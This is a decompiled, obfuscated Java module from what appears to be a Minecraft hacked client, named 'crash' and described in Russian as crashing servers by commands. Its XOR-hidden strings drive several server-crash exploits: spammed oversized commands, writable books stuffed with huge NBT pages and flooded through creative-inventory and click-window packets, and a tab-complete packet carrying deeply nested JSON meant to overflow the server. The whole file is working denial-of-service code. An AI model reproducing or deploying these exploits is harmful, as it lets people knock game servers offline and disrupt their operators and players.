package neo;

import java.util.Objects;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.play.client.CPacketTabComplete;

@0a(
   name = "crash",
   description = "Краш сервера командами."
)
public class 0f extends 0b {
   public _f/* $FF was: 0f*/() {
   }

   private static String FRglTjOjBR() {
      return 0c.PREFIX;
   }

   private static String NK27B1xLGA() {
      return 0c.PREFIX;
   }

   private String generateJsonObject() {
      String in = (String)IntStream.range(19014 ^ -22317 ^ 28367 ^ -29606, 20757 ^ -32500 ^ 25354 ^ -19229).mapToObj((i) -> {
         return frD3UnwdW1("Â");
      }).collect(Collectors.joining());
      return frD3UnwdW1("âø£") + in + frD3UnwdW1("ä");
   }

   private static Item ZBValvxmxK() {
      return Items.WRITABLE_BOOK;
   }

   private static String G6KhqxthCP() {
      return 0c.PREFIX;
   }

   private static EntityPlayerSP MLb9vxeWAl() {
      return Minecraft.player;
   }

   private static Minecraft wTBLJXY2zT() {
      return mc;
   }

   private static Minecraft Zwv0tuCoVA() {
      return mc;
   }

   private static String g7xNUhzGi3() {
      return 0c.PREFIX;
   }

   public void execute(String[] args) {
      if (args.length >= (12436 ^ -32315 ^ 18125 ^ -2147)) {
         if (args[26518 ^ -4561 ^ 8666 ^ -22429].equalsIgnoreCase(frD3UnwdW1("úôð"))) {
            VhdtW7KlKU().sendChatMessage(frD3UnwdW1("¶úôð¹ôêþ¹ªª¨\u00ad«¹ҦәҡҫҬӛ¹Ӛ¹ҥҬҤӖ¹ҦҧӞҬҥӚӛҧ¹ҫӞҬәҩ¹ӘӛҩҢ¹ҩӝң¹Ҥҩ¹\u00ad¹ӞҡӘҩ¹ҡ¹ҫ¹¨«¹ӞҡӘҧҫ¹ҥҬҤӖ¹Ҥҩ¹әӛҦ¹ӚҨҡҢҧ¹ҩ¹ӛҧҥ¹ӛҧҦ¹ҡҤҫ¹Ү¬¹ҡ¹ңӚӞҩ¹Ҩҩӝҧӝ±±±¹ҦҧҥҧҪҡ¹ӞҬәҬҮ¹ҢҧҪҡ¹±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±"));
            0dK.formatMsg(frD3UnwdW1("҃ҧҥҩҤҭҩ¹ҫӒҦҧҢҤҬҤҩ¸"));
         } else if (args[14837 ^ -28544 ^ 11258 ^ -32113].equalsIgnoreCase(frD3UnwdW1("ôï"))) {
            eoeJMTSgZS().sendChatMessage(frD3UnwdW1("¶ôï¹Ç±·³·³·³·³·³·³·³·³·³·³·³·³·³·³·³·³·³·³·³·³·³·³·³·³·²²°½Ç"));
            0dK.formatMsg(frD3UnwdW1("҃ҧҥҩҤҭҩ¹ҫӒҦҧҢҤҬҤҩ¸"));
         } else if (args[9795 ^ -6360 ^ 16675 ^ -32696].equalsIgnoreCase(frD3UnwdW1("úøõú"))) {
            JnLgiNO6rr().sendChatMessage(frD3UnwdW1("¶íö¹ÿöë±ð¤©¢ð¥«¬¯¢ð²²°âÿöë±ó¤©¢ó¥«¬¯¢ó²²°âÿöë±ò¤©¢ò¥«¬¯¢ò²²°âÿöë±õ¤©¢õ¥«¬¯¢õ²²°âõ÷±éð°ääää"));
            0dK.formatMsg(frD3UnwdW1("҃ҧҥҩҤҭҩ¹ҫӒҦҧҢҤҬҤҩ¸"));
         } else if (args[29313 ^ -81 ^ 28866 ^ -532].equalsIgnoreCase(frD3UnwdW1("íö"))) {
            wGy4ZZrnas().sendChatMessage(frD3UnwdW1("¶¶úøõú¹ÿöë±ð¤©¢ð¥«¬¯¢ð²²°âÿöë±û¤©¢û¥«¬¯¢û²²°âÿöë±ñ¤©¢ñ¥«¬¯¢ñ²²°âÿöë±÷¤©¢÷¥«¬¯¢÷²²°âääää"));
            0dK.formatMsg(frD3UnwdW1("҃ҧҥҩҤҭҩ¹ҫӒҦҧҢҤҬҤҩ¸"));
         } else if (args[18168 ^ -28016 ^ 21012 ^ -31108].equalsIgnoreCase(frD3UnwdW1("ÿðþìëüê"))) {
            (new Thread(() -> {
               ItemStack bookObj;
               NBTTagList list;
               NBTTagCompound tag;
               String author;
               int i;
               NBTTagString tString;
               try {
                  bookObj = new ItemStack(YyFAnnBYG9());
                  list = new NBTTagList();
                  tag = new NBTTagCompound();
                  author = Minecraft.getMinecraft().getSession().getUsername();

                  for(i = 15782 ^ -5492 ^ 21476 ^ -31538; i < (23720 ^ -6040 ^ 27756 ^ -10082); ++i) {
                     tString = new NBTTagString(frD3UnwdW1("îïüû¬\u00adà÷\u00adà¯à¯ñà¯ñû¬\u00adàû¬\u00adª¯ûà¬ª\u00ad¯àªû\u00adàûª\u00adªàû\u00ad¬ªûà\u00ad¬ûª\u00adà¬ûàª\u00adàû¬\u00adªàû¬\u00adà¬¹ñªà\u00adñ ®µð¬¯®àû¯\u00adí¬ïë«ú\u00adªëú\u00adª\u00adï\u00adª«íïí\u00adíïàû÷\u00ad÷¯÷¬®ì¯ì¬®ô¯ô¯¯®¡ôð¯¡µ¡¯®µ® öµö ®öµ ®¡ðì÷®àû¯¬\u00ad¬ªï\u00adíàïª\u00adí\u00adíªú«úú\u00ad«ªëúªª\u00adíúïíïí\u00adªíï\u00ad¬íïí¬í¬ï\u00adªíï¬ª\u00ad¬íï\u00adªíï¬ª¬¬ïí¬íªíï¬í¬ªªï¬í\u00ad¬íï\u00adªïí\u00adª¬¬í¬\u00adÿîïüû¬\u00adà÷\u00adà¯à¯ñà¯ñû¬\u00adàû¬\u00adª¯ûà¬ª\u00ad¯àªû\u00adàûª\u00adªàû\u00ad¬ªûà\u00ad¬ûª\u00adà¬ûàª\u00adàû¬\u00adªàû¬\u00adà¬¹ñªà\u00adñ ®µð¬¯®àû¯\u00adí¬ïë«ú\u00adªëú\u00adª\u00adï\u00adª«íïí\u00adíïàû÷\u00ad÷¯÷¬®ì¯ì¬®ô¯ô¯¯®¡ôð¯¡µ¡¯®µ® öµö ®öµ ®¡ðì÷®àû¯¬\u00ad¬ªï\u00adíàïª\u00adí\u00adíªú«úú\u00ad«ªëúªª\u00adíúïíïí\u00adªíï\u00ad¬íïí¬í¬ï\u00adªíï¬ª\u00ad¬íï\u00adªíï¬ª¬¬ïí¬íªíï¬í¬ªªï¬í\u00ad¬íï\u00adªïí\u00adª¬¬í¬\u00adÿîïüû¬\u00adà÷\u00adà¯à¯ñà¯ñû¬\u00adàû¬\u00adª¯ûà¬ª\u00ad¯àªû\u00adàûª\u00adªàû\u00ad¬ªûà\u00ad¬ûª\u00adà¬ûàª\u00adàû¬\u00adªàû¬\u00adà¬¹ñªà\u00adñ ®µð¬¯®àû¯\u00adí¬"));
                     list.appendTag(tString);
                  }

                  tag.setString(frD3UnwdW1("øìíñöë"), author);
                  tag.setString(frD3UnwdW1("íðíõü"), frD3UnwdW1("Íðíõü"));
                  tag.setTag(frD3UnwdW1("éøþüê"), list);
                  bookObj.setTagInfo(frD3UnwdW1("éøþüê"), list);
                  bookObj.setTagCompound(tag);

                  for(i = 25093 ^ -30725 ^ 1605 ^ -7237; i < (18951 ^ -17398 ^ 16670 ^ -18813); ++i) {
                     ((NetHandlerPlayClient)Objects.requireNonNull(wTBLJXY2zT().getConnection())).sendPacket(new CPacketCreativeInventoryAction(5918 ^ -4537 ^ 21930 ^ -21289, bookObj));
                     Thread.sleep(12L);
                  }
               } catch (Exception var7) {
               }

               try {
                  bookObj = new ItemStack(ZBValvxmxK());
                  list = new NBTTagList();
                  tag = new NBTTagCompound();
                  author = Minecraft.getMinecraft().getSession().getUsername();

                  for(i = 12207 ^ -29024 ^ 1505 ^ -23314; i < (623 ^ -11793 ^ 659 ^ -11999); ++i) {
                     tString = new NBTTagString(frD3UnwdW1("îïüû¬\u00adà÷\u00adà¯à¯ñà¯ñû¬\u00adàû¬\u00adª¯ûà¬ª\u00ad¯àªû\u00adàûª\u00adªàû\u00ad¬ªûà\u00ad¬ûª\u00adà¬ûàª\u00adàû¬\u00adªàû¬\u00adà¬¹ñªà\u00adñ ®µð¬¯®àû¯\u00adí¬ïë«ú\u00adªëú\u00adª\u00adï\u00adª«íïí\u00adíïàû÷\u00ad÷¯÷¬®ì¯ì¬®ô¯ô¯¯®¡ôð¯¡µ¡¯®µ® öµö ®öµ ®¡ðì÷®àû¯¬\u00ad¬ªï\u00adíàïª\u00adí\u00adíªú«úú\u00ad«ªëúªª\u00adíúïíïí\u00adªíï\u00ad¬íïí¬í¬ï\u00adªíï¬ª\u00ad¬íï\u00adªíï¬ª¬¬ïí¬íªíï¬í¬ªªï¬í\u00ad¬íï\u00adªïí\u00adª¬¬í¬\u00adÿîïüû¬\u00adà÷\u00adà¯à¯ñà¯ñû¬\u00adàû¬\u00adª¯ûà¬ª\u00ad¯àªû\u00adàûª\u00adªàû\u00ad¬ªûà\u00ad¬ûª\u00adà¬ûàª\u00adàû¬\u00adªàû¬\u00adà¬¹ñªà\u00adñ ®µð¬¯®àû¯\u00adí¬ïë«ú\u00adªëú\u00adª\u00adï\u00adª«íïí\u00adíïàû÷\u00ad÷¯÷¬®ì¯ì¬®ô¯ô¯¯®¡ôð¯¡µ¡¯®µ® öµö ®öµ ®¡ðì÷®àû¯¬\u00ad¬ªï\u00adíàïª\u00adí\u00adíªú«úú\u00ad«ªëúªª\u00adíúïíïí\u00adªíï\u00ad¬íïí¬í¬ï\u00adªíï¬ª\u00ad¬íï\u00adªíï¬ª¬¬ïí¬íªíï¬í¬ªªï¬í\u00ad¬íï\u00adªïí\u00adª¬¬í¬\u00adÿîïüû¬\u00adà÷\u00adà¯à¯ñà¯ñû¬\u00adàû¬\u00adª¯ûà¬ª\u00ad¯àªû\u00adàûª\u00adªàû\u00ad¬ªûà\u00ad¬ûª\u00adà¬ûàª\u00adàû¬\u00adªàû¬\u00adà¬¹ñªà\u00adñ ®µð¬¯®àû¯\u00adí¬"));
                     list.appendTag(tString);
                  }

                  tag.setString(frD3UnwdW1("øìíñöë"), author);
                  tag.setString(frD3UnwdW1("íðíõü"), frD3UnwdW1("Íðíõü"));
                  tag.setTag(frD3UnwdW1("éøþüê"), list);
                  bookObj.setTagInfo(frD3UnwdW1("éøþüê"), list);
                  bookObj.setTagCompound(tag);

                  for(i = 21919 ^ -27908 ^ 22005 ^ -28010; i < (31081 ^ -23695 ^ 24043 ^ -31133); ++i) {
                     ((NetHandlerPlayClient)Objects.requireNonNull(xIJ7BzQeze().getConnection())).sendPacket(new CPacketClickWindow(3881 ^ -7551 ^ 1112 ^ -5648, 16838 ^ -21570 ^ 19067 ^ -24573, 25647 ^ -25290 ^ 18067 ^ -16502, LDHvL9iOgp(), bookObj, (short)(2573 ^ -19172 ^ 18439 ^ -2282)));
                     Thread.sleep(12L);
                  }
               } catch (Exception var6) {
               }

            })).start();
            0dK.formatMsg(frD3UnwdW1("҃ҧҥҩҤҭҩ¹ҫӒҦҧҢҤҬҤҩ¸"));
         } else if (args[3253 ^ -1716 ^ 16801 ^ -19368].equalsIgnoreCase(frD3UnwdW1("õðôûöøìíñ"))) {
            (new Thread(() -> {
               for(int i = 2833 ^ -21291 ^ 9267 ^ -31753; i < (6486 ^ -27581 ^ 10891 ^ -24498); ++i) {
                  MLb9vxeWAl().sendChatMessage(frD3UnwdW1("¶úñø÷þüéøêêîöëý¹¨«ª¨«ª¨«ª¨«ª¹¨«ª¨«ª¨«ª¨«ª"));
               }

            })).start();
         } else if (args[29733 ^ -11256 ^ 6898 ^ -17697].equalsIgnoreCase(frD3UnwdW1("úöôéõüíðö÷"))) {
            String overflow = this.generateJsonObject();
            String partialCommand = frD3UnwdW1("ôêþ¹ÙøÂ÷ûí¤âÉØÀÕÖØÝäÄ").replace(frD3UnwdW1("âÉØÀÕÖØÝä"), overflow);

            for(int i = 20723 ^ -13142 ^ 29815 ^ -6098; i < (15786 ^ -4813 ^ 31995 ^ -21407); ++i) {
               NetHandlerPlayClient var10000 = Eu18itROFa(5ggdrLYlxB());
               Zwv0tuCoVA();
               var10000.sendPacket(new CPacketTabComplete(partialCommand, fuCdnJxVUJ().getPosition(), (boolean)(4551 ^ -22416 ^ 15289 ^ -32242)));
            }
         } else {
            this.error();
         }
      } else {
         this.error();
      }

   }

   private static Minecraft xIJ7BzQeze() {
      return mc;
   }

   private static String YgbXN49s0Y() {
      return 0c.PREFIX;
   }

   private static String _A9nGvJKR7/* $FF was: 4A9nGvJKR7*/() {
      return 0c.PREFIX;
   }

   private static NetHandlerPlayClient Eu18itROFa(EntityPlayerSP var0) {
      return var0.connection;
   }

   private static String Ztgti3I3Ew() {
      return 0c.PREFIX;
   }

   private static EntityPlayerSP wGy4ZZrnas() {
      return Minecraft.player;
   }

   public void error() {
      0dK.formatMsg(frD3UnwdW1("҃ҧҥҩҤҭӒ¹҃әҩӑҬәҩ£¹"));
      0dK.defaultMsg(frD3UnwdW1("¹") + YgbXN49s0Y() + frD3UnwdW1("úëøêñ¹úôð¹´¹҃әҩӑ¹ӘҬәҫҬәҩ¹ӞҬәҬҮ¹ҦҢҩҪҡҤ¹ÚÔÐ·"));
      0dK.defaultMsg(frD3UnwdW1("¹") + NK27B1xLGA() + frD3UnwdW1("úëøêñ¹ôï¹´¹҃әҩӑ¹ӘҬәҫҬәҩ¹ӞҬәҬҮ¹ҦҢҩҪҡҤ¹ÔìõíðïüëêüÚöëü·"));
      0dK.defaultMsg(frD3UnwdW1("¹") + g7xNUhzGi3() + frD3UnwdW1("úëøêñ¹úøõú¹´¹҃әҩӑ¹ӘҬәҫҬәҩ¹ӞҬәҬҮ¹ңҧҥҩҤҭӚ¹¶úøõú·"));
      0dK.defaultMsg(frD3UnwdW1("¹") + FRglTjOjBR() + frD3UnwdW1("úëøêñ¹íö¹´¹҃әҩӑ¹ӘҬәҫҬәҩ¹ӞҬәҬҮ¹ңҧҥҩҤҭӚ¹¶íö·"));
      0dK.defaultMsg(frD3UnwdW1("¹") + G6KhqxthCP() + frD3UnwdW1("úëøêñ¹ÿðþìëüê¹´¹҃әҩӑ¹ңҤҡҪҩҥҡ·"));
      0dK.defaultMsg(frD3UnwdW1("¹") + 4A9nGvJKR7() + frD3UnwdW1("úëøêñ¹õðôûöøìíñ¹´¹҃әҩӑ¹ӘҬәҫҬәҩ¹ӞҬәҬҮ¹ҦҢҩҪҡҤ¹ÕðôûöØìíñ·"));
      0dK.defaultMsg(frD3UnwdW1("¹") + Ztgti3I3Ew() + frD3UnwdW1("úëøêñ¹úöôéõüíðö÷¹´¹҃әҩӑҬә¹ҡҮ¹ÕðèìðýÛöì÷úü·¹ҍҢӖ¹ҫҬәӘҡҠ¹¨·¨¡¹ҡ¹ҫӒӑҬ"));
   }

   private static EntityPlayerSP eoeJMTSgZS() {
      return Minecraft.player;
   }

   private static EntityPlayerSP fuCdnJxVUJ() {
      return Minecraft.player;
   }

   private static ClickType LDHvL9iOgp() {
      return ClickType.PICKUP;
   }

   private static EntityPlayerSP _ggdrLYlxB/* $FF was: 5ggdrLYlxB*/() {
      return Minecraft.player;
   }

   private static EntityPlayerSP JnLgiNO6rr() {
      return Minecraft.player;
   }

   private static EntityPlayerSP VhdtW7KlKU() {
      return Minecraft.player;
   }

   private static Item YyFAnnBYG9() {
      return Items.WRITABLE_BOOK;
   }

   // $FF: synthetic method
   // $FF: bridge method
   private static String frD3UnwdW1(String var0) {
      StringBuilder var1 = new StringBuilder();

      for(int var2 = 9554 ^ -1884 ^ 23760 ^ -32474; var2 < var0.length(); ++var2) {
         var1.append((char)(var0.charAt(var2) ^ 8556 ^ -2907 ^ 22462 ^ -32018));
      }

      return var1.toString();
   }
}
